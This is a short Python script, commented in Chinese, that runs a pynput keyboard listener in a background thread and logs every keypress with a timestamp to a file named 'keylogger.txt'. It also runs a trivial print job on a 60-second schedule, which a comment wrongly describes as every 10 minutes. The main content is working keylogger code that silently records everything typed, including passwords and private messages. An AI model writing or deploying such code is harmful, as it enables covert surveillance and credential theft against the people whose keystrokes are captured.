import threading
import time
from pynput.keyboard import Listener
import logging
import schedule
import time
#引入schedule和time
 
def job():
    print("I'm working...")
#定义一个叫job的函数，函数的功能是打印'I'm working...'
 
schedule.every(60).seconds.do(job)       #部署每10分钟执行一次job()函数的任务

 
   
def key_listern():
	logging.basicConfig(filename = 'keylogger.txt',format="%(asctime)s:%(message)s",level=logging.DEBUG)
	def press(key):
	    logging.info(key)
	with Listener(on_press = press) as listener:
		    listener.join()

def hello():
	print("hello")
def main():
    """创建启动线程"""
    t_sing = threading.Thread(target=key_listern)
    t_dance = threading.Thread(target=hello)
    t_sing.start()
    while True:
    	schedule.run_pending()
    


if __name__ == '__main__':
    main()